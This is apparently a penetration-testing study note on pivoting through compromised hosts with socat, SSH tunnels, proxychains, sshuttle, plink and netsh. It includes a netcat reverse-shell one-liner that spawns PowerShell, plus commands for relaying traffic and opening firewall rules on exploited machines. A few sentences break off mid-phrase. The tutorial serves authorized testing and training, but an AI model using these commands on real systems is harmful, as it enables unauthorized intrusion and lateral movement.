# Port Forwarding

Port forwarding is a technique that let one machine "bridge" his connection between two networks. In a case where we want to access to the machine B (a database) that is connected to the machine A (a virtual machine) that is connected to the WAN, we want first to exploit and access the machine A in order to reach the second machine, routable only through the network in which there is the machine A.

## Using Socat

Socat is a useful tool for Port Forwarding. Let's start it in verbose mode with

```shell
socat -ddd TCP-LISTEN:<KALI-PORT>,fork TCP:<TARGET-MACHINE>:<TARGET-PORT>
```

Next we will connect to it from the Kali VM with the PostgreSQL client that we have only on the Kali machine.

```shell
psql -h <TARGET-IP> -p <TARGET-PORT> -U postgres
```

For an SSH forwarding we can use

```shell
socat -ddd TCP-LISTEN:22,fork TCP:<TARGET-MACHINE>:2222
```

And then we can connect to it via

```shell
ssh user@<TARGET-IP> -p <TARGET-PORT>
```

An useful pre-compiled binary for Windows is [socat-1.7.3.0.exe](https://github.com/tech128/socat-1.7.3.0-windows/tree/master). It has to be run in the folder with all the DLL files. In this way we get a port forwarding from an exploited Windows machine to our Kali machine, and we can connect to the network the Windows machine is connected to.

```powershell
.\socat.exe TCP-LISTEN:2222, TCP:192.168.45.223:4444
```

An example of RevShell for this scenario is

```powershell
nc.exe <IP> 2222 -e powershell
```

# SSH Tunneling

## Local Port Forwarding

In this case we run the command on the **TARGET** that becames the "forwarder" between **KALI** and the **IP-B**. This is useful to directly connect **KALI** to the **IP-B** machine, through the connection forwarded from **TARGET** to **IP-A**. The

```shell
ssh -N -L 0.0.0.0:<LOCAL-PORT>:<IP-B>:<REMOTE-PORT> user@<IP-A>
```

```

KALI ----- TARGET ----- IP-A ----- IP-B [REMOTE-PORT]
|________________________||__________|

```

## Dynamic Port Forwarding

This lets us forward all ports to the **KALI** machine through the connection forwarded from **TARGET** to **IP-A**. It is useful when we want to perform a network scan and in the IP-A machine there isn't the NMAP binary.

```shell
ssh -N -D 0.0.0.0:<LOCAL-PORT> user@<IP-B>
```

```
     
KALI ----- TARGET ----- IP-A ----- IP-B [ALL PORTS]
 |________________________||__________|

```

To use commands we must pass through the SOCKS5 protocol, with the `proxychains` client. This client will forward all traffic to the proxy on the ssh listening port. In this way all the traffic will go through this connection. An example of the usage of proxychains for an nmap scan of the victim's subnet is the following:

```shell
proxychains nmap -sV -A -O 192.168.1.0/24
```

Proxychain configuration at `/etc/proxychains.conf` must be configured

```shell
[ProxyList]
socks5 <IP-B> <LOCAL-PORT>
```

## Remote Port Forwarding

It is more common for firewalls and network administration rules to have only filtering in the inbound traffic, but less filtering on the outbound connections. We can use Remote Port Forwarding to mitigate this defense. The following command is a Remote Port Forwarding from the Kali machine serving the SSH on port LOCAL-PORT and forwarding all the connections to the IP-B on the REMOTE-PORT

```shell
ssh -N -R 127.0.0.1:<LOCAL-PORT>:<IP-B>:<REMOTE-PORT> kali@<KALI-IP>
```

```
    RECEIVED AS OUTBOUND
 |¯¯¯¯¯¯¯¯¯¯¯>¯¯¯¯¯¯¯¯¯¯¯¯¯|      
KALI ----- TARGET ----- IP-A ----- IP-B [REMOTE PORT]
 |___________<____________||_________|
          OUTBOUND
```

## Remote Dynamic Port Forwarding

This, similar to the Local Dynamic port forwarding lets through the usage of `proxychains` to connect to the on all ports, based redirecting the traffic from the IP-A to the Kali machine on the

```shell
ssh -N -R <LOCAL-PORT> kali@<KALI-IP>
```

```
    RECEIVED AS OUTBOUND
 |¯¯¯¯¯¯¯¯¯¯¯>¯¯¯¯¯¯¯¯¯¯¯¯¯|      
KALI ----- TARGET ----- IP-A ----- IP-B [ALL PORTS]
 |___________<____________||_________|
          OUTBOUND
```

# Sshutle

This tools works like a VPN and routes our traffic through the SSH listener we spin on a server. First we have to set up `SOCAT` to listen in the , then we can scan the network simply using a normal NMAP.

```shell
socat TCP-LISTEN:<LOCAL-PORT>,fork TCP:<REMOTE-IP>:<REMOTE-PORT>
```

Next we run sshuttle specifying the subnets we want to be forwarded through the ssh connection

```shell
sshuttle -r database_admin@<REMOTE-IP>:<LOCAL-PORT> <SUBNET-1> <SUBNET-2>
```

Now, an NMAP on SUBNET-1 will work as we were in the same network.
# For Windows

## PLINK.EXE

Plink is the CLI version of PuTTY that allow us to use SSH Remote Forwarding if the OpenSSH service is missing. The syntax specifies the LOCAL-PORT on which Kali will listen and the REMOTE-PORT the Windows Machine will forward the connection to. This is useful in scenarios in which we have access only through CLI on the Windows Machine 1 and we want to connect via RDP to the Windows Machine 2, reachable only from the first Windows Machine.

```

KALI ---SSH--- WINDOWS-1 ---RDP--- WINDOWS-2
 |________________RDP__________________|

```

A simple plink Remote Forwarding is the following

```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:<LOCAL-PORT>:127.0.0.1:<REMOTE-PORT> <KALI-IP>
```

## NETSH

From the Microsoft documentation: "Netsh is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running. Netsh commands can be run by typing commands at the netsh shell and be used in batch files or scripts. Remote computers and the local computer can be configured by using netsh commands. First we must add the interface proxy with

```powershell
netsh interface portproxy add v4tov4 listenport=<LOCA-PORT> listenaddress=<LOCAL-IP> connectport=<REMOTE-PORT> connectaddress=<REMOTE-IP>
```

To show the status of the proxy

```powershell
netsh interface portproxy show all
```

We must allow the firewall rule to open a port in order to use the proxy. For this reason netsh requires Administrator privileges.

```powershell
netsh advfirewall firewall add rule name="port_forward_ssh_PORT" protocol=TCP dir=in localip=<LOCAL-IP> localport=<LOCAL-PORT> action=allow
```

Now, querying the LOCAL-IP with a connection, will connect the Kali machine to the REMOTE-IP on the REMOTE-PORT. At the end of the attack we should restore the firewall rules with

```powershell
netsh advfirewall firewall delete rule name="port_forward_ssh_PORT"
netsh interface portproxy del v4tov4 listenport=<LOCAL-IP> listenaddress=<LOCAL-IP>
```